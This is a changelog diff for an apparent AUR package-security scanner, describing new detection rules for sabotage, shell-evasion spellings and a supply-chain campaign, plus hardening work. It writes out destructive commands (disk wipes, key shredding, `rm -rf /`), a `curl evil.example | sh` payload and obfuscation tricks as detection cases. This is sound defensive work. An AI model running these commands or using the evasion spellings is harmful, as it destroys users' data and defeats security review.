@@ -1,5 +1,803 @@
 # Changelog
 
+## [Unreleased]
+
+### Added
+
+- **A crossfire rule family (X001-X007): the evasion technique, not the
+  payload.** Every other family fires on what a diff does; these fire on how it
+  was written. The reason is where detection actually failed - the payload rules
+  held, and the tokenizer feeding them did not. Partial quoting (`c"u"rl`),
+  array routing (`${A[0]}`), namerefs and command substitution each assemble an
+  executable name that no pattern over the resolved text ever sees, because
+  resolution is the step that broke.
+
+  The failure mode inverts: a defeated tokenizer used to produce silence, which
+  is the worst available output - the analysis reads clean exactly when it
+  understood least. It now produces a CRITICAL finding, so the bypass and the
+  alarm are the same event.
+
+    - `X001` encoded payload decoded to a shell (CRITICAL), `X002` non-literal
+      executable name (CRITICAL), `X003` obfuscated command argument (HIGH),
+      `X004` build output suppressed (MEDIUM), `X005` write into the operator's
+      home (HIGH), `X006` source points somewhere unexpected (HIGH), `X007` two
+      or more techniques in one diff (CRITICAL).
+    - **Measured before weighted.** Against the 3,739-diff locked benign
+      corpus: X001, X003, X004, X005, X006 and X007 fire on **zero** diffs;
+      X002 on 26 (0.695%). The ceiling is 30%, so these sit well under it,
+      which is what makes CRITICAL affordable - legitimate recipes do not
+      assemble command names out of parts. Hardening X002 against evasion
+      raised its rate from 0.374%, and two further exclusions (an expression
+      context is not a command; a leading flag means a continuation line)
+      brought it back down from 1.097%.
+    - **The anti-evasion rules were themselves attacked, and lost twelve
+      times before they held.** A family whose purpose is detecting evasion is
+      the one place where "can the rule be evaded" is not rhetorical. X002 fell
+      to nine variants that displace the command word - an assignment prefix
+      (`FOO=1 ${A[0]}`), a wrapper (`env`, `exec`, `sudo`, `nohup`,
+      `timeout 5`), a leading redirect (`>out ${A[0]}`) and a subshell
+      (`( ${A[0]} )`) - because it read the first token rather than walking
+      past prefixes. X001 fell to `| /bin/sh` and `| env sh`; X005 to
+      `/home//alice` and an assignment prefix. All are closed and pinned as
+      regressions in `tests/test_crossfire.py` (47 tests), alongside a bounded
+      matching check: no pattern may be made to backtrack on an 8 KiB hostile
+      line, which is the failure a sabotage rule already produced once.
+    - **X002's exclusions were derived from the corpus, not guessed.** An
+      assignment names no executable (`font=$(grep ...)`); a variable the
+      tokenizer reduced to a literal is a spelling choice, not an evasion; and
+      quotes and parentheses bound the command split, because a `|` inside
+      `sed 's|a|b|'` and an `&&` inside `(( a && b ))` are not command
+      separators. Each of those produced false positives before it was handled.
+    - **Two candidates were dropped for overlap rather than difficulty.**
+      Base64-to-shell is R003/R043 at CRITICAL; bidi and homoglyphs are R013 at
+      FATAL plus R013b. X001 ships as the *remainder* of the first. There is no
+      X008: the bidi rule leaves nothing for it to do, and scoring the same
+      characters twice would corrupt the calibration.
+    - **X005 became a rule about the spelling, not the write.** R077 already
+      claims a target starting with `~/` or `$HOME/`, so a second rule beside
+      it scored one line twice. But R077 matches only that prefix, and the same
+      directory is reachable as `/home/alice/...`, `/home/$USER/...`,
+      `~alice/...`, `/root/...`, `${HOME:-/home/alice}/...`, or by traversing
+      into it - none of which it sees. X005 now owns exactly those, defers to
+      R077 on the plain spelling, and exempts `$pkgdir` staging. It fires on
+      zero benign diffs.
+    - **R077 is CRITICAL inside an install scriptlet.** pacman runs scriptlets
+      as root during the transaction, so a write into a user's home from one is
+      categorical rather than suspicious. The same write during `build()` stays
+      HIGH.
+    - **Two more were dropped on measurement.** Bare `2>/dev/null` fires on
+      0.481% of benign diffs as ordinary defensive shell, so X004 excludes it.
+      Domain reputation and upstream-owner matching are absent from X006
+      because the novelty tier already scores a globally-first-seen URL.
+
+- The `crossfire` category, previously reserved for cross-package comparison
+  and shipping nothing, now carries this family. `R143` moved to
+  `maintainer-and-metadata`, where `R141` already lives: it had been filed under
+  `crossfire` by mistake, which left the generated index simultaneously listing
+  it and stating that crossfire ships nothing. `COMPOSITION` was not an option
+  either - its rules are weight-0 annotations and R143 scores 25.
+
+- **A sabotage rule family (S001-S008).** Every other family describes a
+  supply-chain compromise - code fetched, credentials sent, persistence
+  installed - and all of them assume the attacker wants something *out* of the
+  machine, so there is a fetch or an egress to notice. A sabotage payload
+  wants nothing out: it runs, and the machine is worse off.
+
+  Measured before these rules existed, all of the following scored **0/100**
+  in `build()`: a classic fork bomb, `rm -rf / --no-preserve-root`,
+  `dd if=/dev/zero of=/dev/sda`, `mkfs.ext4 /dev/sda1`,
+  `shred -u ~/.ssh/id_rsa`, `chmod -R 777 /`, an `xmrig` invocation, and
+  `history -c`. A `curl | bash` on the same line scored 65, which is the shape
+  of the gap: excellent at supply-chain compromise, blind to sabotage. It was
+  not a documented limit either.
+
+    - `S001` recursive self-spawn (CRITICAL), `S002` recursive deletion
+      outside the build tree (CRITICAL), `S003` raw block device write
+      (CRITICAL), `S004` secure deletion of user data (HIGH), `S005`
+      permission change on a system path (HIGH), `S006` system service
+      disruption (HIGH), `S007` cryptocurrency miner (HIGH), `S008` shell
+      history or log destruction (MEDIUM).
+    - Named **sabotage**, not destruction: exhausting the CPU, stopping the
+      services a machine exists to run, and mining someone else's coin all
+      destroy nothing, and a family called destructive would have had no home
+      for them.
+    - Three distinctions carry the calibration, because none of these commands
+      is rare in a PKGBUILD. The build sandbox is not the system (`rm -rf
+      "$srcdir/build"` is housekeeping). A mention is not an invocation
+      (`echo "never run rm -rf /"` is a recipe being helpful, so every command
+      name is anchored to command position). A package's own service is not the
+      system's (`systemctl disable input-remapper` on removal is standard
+      packaging, so only system units count).
+    - Every rule fires on **zero** of the 3,739 diffs in the locked benign
+      corpus.
+
+- **AUR dependency depth.** An AUR package's `depends` and `makedepends` can
+  name other AUR packages, and `makepkg` builds those on your machine in the
+  same run - so a review that read only the package you typed was reading one
+  recipe out of several that would execute. This is the June 2026 campaign's
+  relevance: an orphan is far more often somebody's dependency than the thing
+  they meant to install.
+
+  `[depth] levels` in config and `--depth` per run: `0` disables it, `1` (the
+  default, for both `review` and `inspect`) analyses direct AUR dependencies,
+  `n` analyses `n` levels, `-1` walks every level there is.
+
+    - **Each dependency is analysed as a package**, not as a component of
+      one: its own score, its own band, its own coverage gaps, its own row in
+      the database. Nothing is folded into the parent's score. That is
+      load-bearing rather than fastidious - `depth` is deliberately absent
+      from the config fingerprint, so a parent score that moved with
+      `--depth` would break B1 for every operator comparing two runs.
+    - **`-1` is bounded, and has to be.** The dependency graph is written by
+      the party under review: a recipe declaring five hundred AUR
+      `makedepends`, each declaring five hundred more, would otherwise decide
+      how many repositories this machine clones - the A14 breach that Part D
+      lists as a vulnerability. The ceilings are `depth.MAX_DEPTH_LEVELS` (8)
+      and `depth.MAX_DEPTH_NODES` (200 per run), both source constants.
+    - **New `deps_not_scanned` coverage gap**, recorded when the walk stopped
+      early: a ceiling cut it short, or a dependency could not be analysed. A
+      walk that *completed* is not a gap - asking for depth 1 and getting
+      depth 1 answers the question that was asked, and calling that
+      incomplete would make every default run report a gap and teach readers
+      to ignore it.
+    - The walk is cycle-safe, and one dependency is analysed once per run
+      even when twenty installed packages share it.
+    - **On the corpus path** (`full-aur`) the walk reads results the cycle has
+      already computed - the stored package profile first, the stored PKGBUILD
+      snapshot as a fallback - instead of re-running the pipeline for a package
+      that is analysed as a root anyway. Its visited set is deliberately *not*
+      shared between corpus packages: every package is a root there, so a
+      shared set would hand each dependency to whichever parent ran first and
+      leave every other parent reporting an empty closure, which reads as "this
+      package has no AUR dependencies".
+    - Dependency metadata comes from the corpus snapshot when one exists (no
+      network at all), otherwise one batched AUR RPC request per level.
+      `optdepends` is out of scope - it is not installed by default.
+    - **Mini-cards.** Each dependency renders as its own card nested inside
+      the package's card, indented by level, on all four terminal surfaces,
+      and as a `dependencies` array on all three JSON surfaces. The
+      `every render reports the same information` gate was extended to cover
+      them, so a dependency shown in one surface cannot be missing from
+      another.
+
+- **Detection for the June 2026 AUR campaign ("Atomic Arch",
+  Sonatype-2026-003775).** The campaign hijacked ~1,500 orphaned packages,
+  left the upstream source untouched, and added npm build dependencies whose
+  install step ran a credential-harvesting binary during `makepkg`.
+
+  Measured before this change, on a database with a normal corpus, that diff
+  scored **15/100 - UNFLAGGED**. The 65 an empty database produced was an
+  artifact: 50 of those points were D001 "this dependency has never been seen
+  in the AUR", which goes silent once the corpus knows `npm` and `nodejs`. The
+  better the corpus, the lower the attack scored. It now scores **70/100,
+  High**.
+
+  Four pieces, and only the first is a security invariant:
+
+    - **`unpinned_build_deps` coverage gap (B2, A14).** `makepkg` verifies
+      `source=()` against `sha256sums` and verifies nothing a build step
+      resolves from a registry, so when `prepare()` runs `npm install foo` the
+      code that will execute is not in the analysed text. That is a missing
+      sensor, so it is reported as one: the gap forbids UNFLAGGED and
+      qualifies the band. Deliberately **not** a scored rule - `npm install`
+      in a build function is ordinary AUR practice, which is exactly why R081
+      is scoped to install hooks and a calibration gate keeps it there, and
+      why the attack looked normal. Fires on 0.3% of the locked benign corpus.
+    - **R141 (adopted from orphan, MEDIUM).** The campaign's entry point.
+      R092/R093/R107/R111/R126 all describe adoption and all need a
+      `full-aur` cycle, so `trustsight review` users - the people actually
+      hit - had no adoption signal at all. R141 uses the AUR `Maintainer`
+      field the review path already fetches and threw away. Orphan state is
+      persisted tri-state (orphaned / maintained / never asked), and an
+      unavailable RPC records unknown rather than guessing either way.
+    - **R142 (recipe changed without upstream, MEDIUM).** A dependency array
+      **and** a build function both moved while `source=`, every `*sums=` and
+      `pkgver` did not. The conjunction is measured, not assumed: on the
+      3,739-diff benign corpus `deps or build` fires on 11.53% and
+      `deps and build` on **1.42%** - eight times less noise for no lost
+      detection, since the campaign changed both. It also keeps R142 off
+      R060's territory, which is INFO precisely because "build function
+      modified" fires on 21.4% of benign diffs.
+    - **R143 (the composition, HIGH).** R141, R142 and a registry resolution
+      together. Each member is ordinary alone and cheap by design; scoring
+      the conjunction is what clears the flag threshold without any single
+      rule spending fire rate it does not have.
+
+- **An IOC surface for names a build step installs.** A `package` indicator
+  reached the AUR package name, `pkgbase` and the dependency arrays. The
+  campaign named its payload in none of those - `atomic-lockfile` appeared
+  only as an argument to `npm install` inside `prepare()` - so a curator's
+  list naming it would have matched nothing. Matches now carry the
+  `build_install` surface.
+
+- **`data/iocs/atomic-arch-2026-06.json`**, three `package` indicators
+  (`atomic-lockfile`, `lockfile-js`, `js-digest`) with `Sonatype-2026-003775`
+  provenance, built to an unsigned baseline in `ioc-baselines/`. Narrowest
+  indicator per the curation policy: the `deps` binary name is deliberately
+  **excluded** as far too generic without a hash, and no domains or hashes
+  were invented.
+
+### Security
+
+- **Two render paths sanitised untrusted text with the weaker helper.**
+  `safe_text` is explicit that the boundary is where a value is *rendered*,
+  so stored evidence and JSON stay byte-exact. Two paths used
+  `unicode.strip_ansi` instead, which removes CSI sequences and leaves C1
+  control bytes, BEL and newlines behind. `\x9b2J` is the 8-bit spelling of
+  "clear the screen", so an attacker-derived finding reason could repaint
+  the terminal, which is precisely the forgery `safe_text` was written to
+  prevent. Both spellings look like sanitising at a glance, which is why
+  this survived review.
+
+- **Federated IOC values were passed to Rich as bare strings.** `ioc.py`
+  did not import `clean` at all and rendered the indicator value, its
+  source and its confidence directly. Rich parses a bare `str` as markup,
+  so an entry containing `[/]` raises `MarkupError` and **aborts the whole
+  table**: one hostile indicator in an imported baseline made `ioc list`
+  unusable rather than merely ugly. IOC federation means third parties
+  supply these fields by design. Values are now `clean`ed and wrapped in
+  `Text`.
+
+  A new `untrusted text is sanitised where it is rendered` gate checks both
+  properties across every CLI module, on calls and imports rather than on
+  the substring so that a comment explaining the rule does not trip it.
+
+
+- **Three rule patterns did not exist until match time, and nothing audited
+  them.** R013, R047 and R048 carry a placeholder in the TOML and are
+  assembled when `apply_rules` runs: R013 from Unicode data, R047 and R048
+  from operator config. That made them invisible to all three of the
+  audit's collection strategies at once, since they are not a TOML literal,
+  not a `re.compile("literal")` in the source, and not a module-level
+  `re.Pattern`. R013 is the **FATAL** homoglyph rule, and because R047/R048
+  are derived from config, a config edit could have introduced a slow
+  pattern with no gate positioned to notice.
+
+  Generation moved into `rules.resolve_generated_patterns`, which
+  `apply_rules` and the audit both call, so the audit checks the pattern
+  that actually executes rather than the placeholder. Auditing a
+  placeholder is worse than not auditing: it reports coverage it does not
+  have. All three measured fast and needed no change.
+
+- **The regex audit was blind to 18% of the patterns it was meant to cover.**
+  It collected patterns by walking the AST for `re.compile("literal")`, so
+  a pattern assembled from parts, `re.compile(_WRITE_CMD_START + r"tee ...")`,
+  is a `BinOp` rather than a `Constant` and was skipped in silence. That was
+  **44 of 246 patterns**, concentrated in `sabotage` (11), `persistence` (6)
+  and `crossfire` (4): the modules built from shared command-start prefixes,
+  where one bad component would have spread across many rules unchecked.
+
+  The audit now also enumerates every compiled pattern reachable from an
+  imported module, which is the only way to see a pattern whose text does
+  not exist until it is built. Coverage went from 233 to 255 distinct
+  patterns, deduplicated by pattern text so the count means something, and
+  the audit applies the same growth check `rules._compiled` does.
+
+  A new `every live regex is audited` gate asserts the *coverage* rather
+  than the verdict, because a gate that passes because it never looked is
+  the failure this codebase keeps finding. All three previously unaudited
+  patterns that exceeded 10 ms on a full line were measured and are linear,
+  a large constant rather than a complexity bug, so nothing needed fixing
+  once they were finally visible.
+
+- **Three shipped patterns were quadratic, and the probes could not see it.**
+  `BACKTRACK_REPS` is 22, which is tuned for *exponential* backtracking:
+  2^22 is millions of steps and shows instantly. Polynomial cost is
+  invisible there - 22 squared is 484 steps - while rules run against lines
+  up to `rules.MAX_RULE_LINE_BYTES` (8192), where the same pattern costs 67
+  million. Every one of these passed the short probes and the CI audit:
+
+  | Pattern | Cost on one 8 KiB line | After |
+  |---|---|---|
+  | `novelty._VERSION_RE`, `\d+(?:\.\d+){1,}` | 3215 ms | 2.2 ms |
+  | `build._SUDO_CMD_START_RE`, two adjacent `\s*` | 1113 ms | 0.6 ms |
+  | `novelty._TRAILING_RE`, `/+$` | 596 ms | replaced with `rstrip` |
+  | `sabotage._FORK_BOMB_DEF_RE` | 20 ms | 5.7 ms |
+
+  A 5 MiB diff of full-length lines is ~640 lines, so the version matcher
+  alone was about **36 minutes of CPU** for one package - under every cap
+  added this release. Aggregate worst case across all patterns fell from
+  4870 ms to 143 ms. The fixes are bounded repetition (`\d{1,32}`),
+  possessive quantifiers, collapsing an ambiguous `\s*\s*` pair, and one
+  regex deleted in favour of `str.rstrip`; behaviour is unchanged in every
+  case, checked against the shapes each rule exists to match.
+
+  The detector now probes at `LONG_PROBE_LEN` (2048) as well as 22, and
+  measures **growth** rather than only absolute time: four times the input
+  costs about four times the time when a pattern is linear and sixteen when
+  it is quadratic, so `SUPERLINEAR_GROWTH` separates them. Absolute time
+  alone was not enough - the `sudo` pattern is quadratic with a small
+  constant and sat under the budget at the probe length while still costing
+  seconds at a full line. `lint` reports the growth case with its own
+  message, because "cheap on a short line, expensive on a long one" is not
+  what a rule author reads "exponential" to mean.
+
+  Two patterns previously documented here as linear - `(-?\d+,)+;` and
+  `(a|ab)+c` - are quadratic (15.4x and 14.8x growth for 4x input). They
+  were classified from measurements at n<=26, which is exactly the blind
+  spot being closed. Prefix-overlap alternation is refused again, now on
+  measurement rather than on a structural guess.
+
+- **The one runtime-built pattern is now audited like a shipped one.**
+  `scripts/regex_audit.py` reads source, so it covers every `re.compile` in
+  the tree - except the pattern `find_line_in_diff` assembles from its
+  argument. That function took regex syntax, compiled it **unescaped
+  first**, and fell back to escaping only on `re.error`, so any argument
+  that was *valid* regex ran as one against every line of the diff, with no
+  backtracking check anywhere on the path. A supplied `(a+)+$` cost **5.6
+  seconds against a single 24-character line**, doubling every two
+  characters after that.
+
+  All twelve call sites pass either an intentional pattern or an escaped
+  fragment, so nothing was exploitable today; the exposure was that
+  forwarding package text once would have been enough. A dynamic pattern is
+  now held to the same standard as a shipped one, and a refused pattern is
+  matched as the literal text it probably was rather than dropped - 5.6s
+  becomes 0.000s and the intentional patterns still work.
+
+  Two copies of the function existed, in `analysis/delivery.py` and
+  `analysis/structural.py`. They are one shared helper in `rules.py` (which
+  already owns the regex-safety import), with a test asserting no local copy
+  returns, because identical code in two modules is how a fix lands in one
+  of them.
+
+- **A URL is sliced before it is escaped, not after (C005).** Cutting an
+  escaped string can cut an escape sequence in half; the compile then fails,
+  the fallback escapes the already-escaped text, and the line number is
+  silently lost - on exactly the long URLs the rule is reporting.
+
+- **The backtracking detector is probed with the pattern's own alphabet.**
+  `regex_safety` decides whether a pattern may run against hostile text, so
+  its sensitivity is the security property. It ran six fixed probes made of
+  `a`, spaces, `/` and `|` - **no digit appeared in any of them**, so every
+  pattern driven by `\d` or `[0-9]` was tested with input it could not
+  match and scored a risk of exactly 0.0s, which reads identically to safe.
+  Of ten known-catastrophic patterns, five passed.
+
+  Probes are now derived from each pattern's own classes and literals, which
+  generalises instead of extending a list of the attacks somebody thought
+  of. Two fixed probes were added for shapes the derivation does not reach:
+  a digit run, and a dotted name with no scheme - `https://a.a.a.com` cannot
+  reach a `^`-anchored host pattern, because it fails at position 0 before
+  any backtracking starts, and host-shaped patterns are everywhere here. The
+  structural check also now catches a quantified character class inside a
+  quantified group (`([0-9]+)+`) and identical alternation branches
+  (`(x|x)*`). All ten are refused; 233 shipped patterns and 11 TOML rule
+  patterns still compile, and probing a safe pattern costs 0.027 ms.
+
+  Prefix-overlap alternation (`(a|ab)+`) is deliberately **not** refused.
+  The textbook calls it ambiguous, but measured in CPython it is flat under
+  both attack shapes, and a refused pattern does not raise - `_compiled`
+  returns None and the rule quietly stops matching. A false refusal is a
+  hole, not an inconvenience, so the check stays where the evidence is.
+
+- **A line-count cap on rule matching (`rules.MAX_SCANNED_LINES`).**
+  `MAX_RULE_LINE_BYTES` bounded how *long* a line may be and nothing bounded
+  how *many* there are, but matching costs per line - about 0.46 ms - so the
+  5 MiB byte cap permitted ~1.3 million short lines and roughly **ten minutes
+  of CPU** for one package, times `depth.MAX_DEPTH_NODES` (200) at full
+  depth. A 200,000-line diff now takes 8.9s instead of 92s.
+
+  The cap is 20,000: five times the largest diff in the 3,739-diff locked
+  benign corpus (3,839 lines; p99.9 is 2,117), so it truncates none of them.
+  Truncating reports a new `scan_truncated` coverage gap and sets the
+  matching `scan_truncated` field on the report, kept distinct from
+  `diff_truncated` because they name different dials - a reader who saw only
+  the byte gap would raise `[diff] max_diff_bytes` and find it changed
+  nothing.
+
+  `analyze_package` and `scan_diff` are parallel implementations that each
+  tokenize and each match, so the clamp is one shared helper rather than two
+  copies, and a test walks the AST to assert nothing tokenizes an unclamped
+  diff. The byte cap beside it was originally written on the git path alone,
+  which is the same mistake one step earlier.
+
+- **Resource bounds derived from the resource, not from the wire format.**
+  A14 says no package-controlled input decides how much CPU, memory, network
+  or disk this process uses. Five places bounded an input without bounding
+  what the input became, and each looked adequate on its own:
+
+    - `MAX_DECOMPRESSED_BYTES` was set against the ~250 MB AUR dump on the
+      wire. Measured with `tracemalloc`, dump-shaped JSON parses into Python
+      objects at about **6x** its serialised size, so the 1 GiB ceiling
+      permitted ~6.1 GiB of live objects. Lowered to 512 MiB, with the
+      measured factor recorded as `JSON_OBJECT_AMPLIFICATION` so the ceiling
+      can be re-derived rather than guessed at.
+    - The IOC baseline loader capped bytes (`MAX_BASELINE_BYTES`, 256 MiB)
+      and not entries, so a baseline was millions of `IocEntry` objects.
+      Added `MAX_BASELINE_ENTRIES`.
+    - Clones and fetches were bounded by a 120-second deadline and nothing
+      else. A deadline is not a byte budget: on a fast link it is gigabytes
+      written straight to the cache. Added `MAX_TRANSFER_BYTES` (256 MiB) via
+      the existing progress callback.
+    - A per-repository ceiling is not a disk bound, because the dependency
+      walk multiplies it by `depth.MAX_DEPTH_NODES` (200) - two caps that
+      each look sufficient compose to their product, 50 GiB. Added
+      `MAX_TOTAL_TRANSFER_BYTES` (2 GiB), charged across the whole run.
+    - Repository history is authored by the party under review, and three
+      walks ran it to exhaustion - one of them decoding a PKGBUILD blob per
+      commit. Added `MAX_HISTORY_COMMITS` and `fetcher.walk_bounded`, a
+      single implementation the fourth walk (`temporal`, which had its own
+      inline counter) now shares. A test asserts no raw `repo.walk` survives
+      outside it, because "a control applied at one of several equivalent
+      call sites" is the recurring failure this codebase has.
+
+  An oversized transfer raises a `_TimeoutError` subclass deliberately:
+  every call site already treats that as "this fetch did not complete", and
+  a new exception type would be a second path for one of them to forget.
+  There is no GPU bound because there is no accelerator code - nothing in
+  the tree imports CUDA, PyTorch, OpenCL or NumPy.
+
+- **A crafted `source=` URL could cost half an hour of CPU.** URL
+  classification walked every hostname label and computed every parent
+  domain, which is quadratic in label count. One 8 KiB host made of dots took
+  421 ms, and `MAX_URLS_PER_SIDE` allows 4,096 URLs per side, so a single
+  package could spend roughly 29 minutes in classification alone - A14 says no
+  package-controlled input decides how much CPU this process uses.
+
+  Bounded by DNS's own limits, `MAX_HOST_BYTES` (253) and `MAX_HOST_LABELS`
+  (127): nothing past those is a hostname anyone can resolve. A full cap of
+  4,096 hostile URLs went from **163 s to 2.7 s, a 60x improvement**.
+
+  Labels are dropped from the **left**, not the right. The first version of
+  this fix truncated the leading 253 bytes and discarded the registrable
+  domain - the part every classification decision reads - which a test caught.
+  And truncating rather than refusing is deliberate: refusing an over-length
+  host outright would let an attacker pad a homograph domain past the check,
+  so padding a known homograph with 5,000 labels is asserted to classify
+  exactly as the bare host does.
+
+- **`.SRCINFO` parsing was quadratic.** `parse_srcinfo` tested membership with
+  `value not in result[key]` - a linear scan of a growing list, once per line.
+  With every value under one key, which is what a `depends` array is, that is
+  O(n^2): a 200,000-entry file took **561 seconds**. Membership now uses a set
+  beside the list, so order and de-duplication are unchanged: **256 ms**, a
+  2,195x improvement. `diff_srcinfo` had the same shape in its added/removed
+  comprehensions and is now linear too, and the blob read is size-checked
+  before `.data`.
+
+  Three bounds were added, matching what the differ applies to a patch:
+  `MAX_SRCINFO_BYTES`, `MAX_SRCINFO_LINES`, `MAX_SRCINFO_VALUES_PER_KEY`.
+
+  **This module is not currently imported by production code**, so the defect
+  was latent rather than exploitable - the live `.SRCINFO` consumer,
+  `full_aur.properties.extract_properties`, already used sets. It is fixed
+  rather than left because dead code that gets wired up later is exactly how a
+  nine-minute parse reaches a user.
+
+- **The A5 hostile-input gate measured only one of two shapes.** It timed a
+  single 5 MiB *line*, which the 8 KiB clamp makes cheap. The same byte budget
+  spread over many *lines* pays the whole ruleset per line and costs far more -
+  the gate now measures both, and reports each separately.
+
+- **A command name split across a line continuation was invisible to every
+  rule.** Both continuation joiners inserted a space, so `cur\` followed by
+  `l https://...` became `cur l https://...` - two words, and nothing that
+  matches a command name saw either. The shell *removes* a backslash-newline;
+  it is not whitespace. `curl https://evil.example/x | sh` written that way
+  scored 20 (the source-domain prior alone) and now scores 65.
+
+  There were **two joiners** - `join_line_continuations` and the indexed form
+  the rule path uses - and fixing the first left the second reachable, which
+  is the "control applied at one of several equivalent call sites" failure
+  `contributing/security-review.md` catalogues. Both now join verbatim, and
+  indentation on the continuation line still separates arguments.
+
+- **Two more shapes for X002**, found by wrapping one payload sixteen ways:
+  brace expansion assembling a name (`cur{l,}`) and a character that
+  impersonates ASCII (`сurl`, Cyrillic). Both scored 20 before and score 60
+  now.
+
+  The homoglyph shape uses the curated confusable map `buckets` already
+  applies to domains, not "any non-ASCII character": the broader form raised
+  X002's benign rate from 0.695% to 0.802% by firing on ordinary English prose
+  carrying a typographic apostrophe, which impersonates nothing. Narrowing it
+  returned the rate to 0.695% with the detection kept.
+
+- **Esoteric-input sweep.** Thirty-seven shapes - heredocs (quoted, unquoted,
+  dash), here-strings, process substitution, brace ranges, parameter
+  operators, array slices, `case`, CRLF, missing trailing newline, NUL bytes,
+  BOM, astral planes, combining marks, NFD, lone-surrogate escapes, malformed
+  and negative hunk headers - produced **zero crashes and zero
+  nondeterminism**. Sixteen carrying a live payload are now pinned as
+  regressions: none may score on the source prior alone.
+
+- **B2's calibration table was stale in six of eight figures.** Verified by
+  recomputing every one against the locked corpus with the same code path the
+  calibration gate uses: corpus size 3,246 -> 3,739, benign p95 45 -> 35,
+  zero-rate 69.1% -> 68.3%, benign above threshold 16.3% -> 13.1%, the
+  percentile 20 sits at 83.7th -> 86.9th, and the separation margin 15 -> 25.
+  Median (0), malicious p5 (60) and malicious minimum (40) were correct.
+
+  Every drift is in the safe direction - the tool flags fewer benign updates
+  than documented and separates the populations more widely - but the doc's
+  own promise is that a published number is measured, so "better than stated"
+  is still stated wrongly. The prose said a reviewer should expect to look at
+  roughly one benign update in six; it is now closer to one in eight.
+
+- **The coverage-gap count said seven where eight are listed.** An off-by-one
+  introduced with `deps_not_scanned`; the table itself was complete.
+
+- **The diff generator's byte cap was inert on the path that uses it.** The git
+  path called `generate_diff` with no `max_bytes`, so the internal capping
+  block was skipped entirely: every filtered patch was materialised in full via
+  `patch.text`, joined into one string, and only then truncated to 5 MiB. A
+  repository with one 2 GB `.install` diff allocated 2 GB before any bound
+  applied. `MAX_GENERATED_DIFF_BYTES` existed and did nothing on that path, and
+  A4's own wording hedged it - "capped ... *when the git path requests a
+  limit*", which it did not.
+
+  The bound that matters now runs *before* `patch.text`. That attribute has
+  already allocated the whole patch by the time it returns, so a cap applied
+  afterwards bounds retention rather than memory - the same distinction this
+  release draws for tar members and blobs, and one the first version of this
+  fix got wrong. A delta whose declared file size on either side exceeds
+  `MAX_PATCH_SOURCE_BYTES` is now skipped without its text being requested,
+  which is the only bound available ahead of the allocation; a patch is at
+  most the changed lines plus context, so a file small on both sides cannot
+  yield a large one. Text that is read is capped at `MAX_PATCH_BYTES`, the
+  retained total at `MAX_GENERATED_DIFF_BYTES`, patches visited at
+  `MAX_DIFF_PATCHES`, and the summary at `MAX_DIFF_SUMMARY_FILES` - the
+  summary walked every delta regardless of the text cap, so a wide repository
+  chose the size of a stored `fact_json`.
+
+  What none of this covers is libgit2's own diff construction: `repo.diff()`
+  builds the diff before any of it runs, and that cost is a property of the
+  repository. It sits inside the stated dependency assumption and is now
+  documented rather than implied.
+
+- **Generator-side truncation is returned, not inferred.** This is the pairing
+  that matters, and fixing the bound without it would have created the defect
+  it prevents: a patch the generator declines to retain leaves the assembled
+  text at or under the cap, so a caller measuring that text reports a complete
+  analysis while content was skipped. That is the silent skip B2 forbids and
+  Part D lists as in scope. `generate_diff_bounded` returns the flag and the
+  pipeline consumes it; the two-value `generate_diff` remains for existing
+  callers.
+
+  Policy omission stays distinct from truncation: a `.png` the filter never
+  reads leaves nothing unexamined, while a `.install` dropped at a cap does,
+  and only the second sets the flag.
+
+- **The PKGBUILD blob driving companion discovery was read unbounded.**
+  `blob.data` materialises everything, and the size check came afterwards - so
+  the one blob guaranteed to exist was the one read without a bound, while the
+  companion blobs beside it were checked first. Now bounded by
+  `MAX_PKG_BUILD_BYTES` before `.data` is touched, with a test that proves the
+  ordering behaviourally rather than by reading the source.
+
+- **Companion discovery walked the whole tree.** `MAX_COMPANION_FILES` applies
+  to the *selected* set, so the walk producing that set was unbounded; it now
+  stops at `MAX_COMPANION_TREE_ENTRIES`. A referenced basename past
+  `MAX_COMPANION_NAME_BYTES`, or carrying any path structure (absolute,
+  traversal, separators, NUL), is refused rather than rendered into a hunk
+  header naming a file the reader cannot open.
+
+- Two new gates: `generated diff is bounded before assembly` and
+  `companion reads are bounded before data`.
+
+- **A snapshot member was read with no bound.** `MAX_RESPONSE_BYTES` caps the
+  *compressed* snapshot body at 32 MiB, and `_pkgbuild_from_tarfile` then read
+  the PKGBUILD member with a bare `read()`. A tar member's declared size is
+  the attacker's number, and gzip on compressible content runs to roughly a
+  thousand to one, so a tarball comfortably inside the response cap could
+  declare - and cause the process to allocate - tens of gigabytes. Member
+  reads are now bounded by `full_aur.fetch.MAX_TAR_MEMBER_BYTES` as the bytes
+  are materialised.
+
+- **Artifact reads happened before the checks that were supposed to bound
+  them.** An Ed25519 signature is computed over the bytes of the thing it
+  signs, so verification cannot run until those bytes are read: a bound
+  behind the check guards nothing. The same applied to a digest recorded for
+  attribution (A12) and to `gunzip_capped`, which capped an expansion it only
+  ever saw as an already-materialised buffer. `ioc_baseline`, `full_aur.export`,
+  `db` and `seed_build` now bound every such read before it happens.
+
+- **New `trustsight.bounded_io`.** `read_capped` and `read_file_capped`, both
+  refusing rather than truncating. A truncated read is a complete-looking one
+  with its tail quietly removed, which is the seam A5 and A6 already refuse.
+
+- **A refused snapshot is a coverage gap, not a silent fallback.** A refused
+  archive and a package with no snapshot both fall back to the cgit text
+  fetch, so on the fallback alone they are indistinguishable. The new
+  `snapshot_refused` gap records that a bound in this program dropped
+  content, travelling alongside `tree_not_analyzed`, which only says the tree
+  was not read. A14 requires a bound that drops content to be visible as a
+  bound.
+
+- **Two new gates, both structural.** `every stream read is bounded` scans the
+  whole source for a zero-argument `read()`; it caught a site
+  (`seed_build._read_raw_maintainers`) that a targeted audit had missed, which
+  is the case for scoping wide. `artifact reads are bounded before
+  verification` enumerates the artifact-loading modules.
+
+- **`no path-based archive extraction`**, renamed from `archives are never
+  extracted to disk`. The old name was broader than both the check and the
+  truth: `db._extract_v2_archive` does write seed members to disk, under an
+  explicit containment guard. A8 now states that plainly, names the guards,
+  and points at A12 as the actual trust anchor, instead of implying an
+  extraction surface that does not exist.
+
+### Changed
+
+- **The complete hardening pass is covered by 2,473 tests, 65 security gates, and 10 calibration gates.** The standalone calibration runner now loads the repository source tree explicitly, so it cannot accidentally validate an older installed TrustSight package instead of the checkout under review.
+
+- **Documentation moved to `docs.trustsight.org`.** 32 links across `README.md`
+  and the site configuration (`site_url`, `canonical_host`, `public_base_url`,
+  and the Open Graph image) now point at the new domain.
+
+- **Performance: a large diff scans 31% faster, and CLI startup drops ~180 ms.**
+  Profiled rather than guessed at, and every change is behaviour-preserving.
+
+    - `deps._strip_comment` was called about **thirty times per diff line** -
+      each rule module stripped comments independently - and is a pure
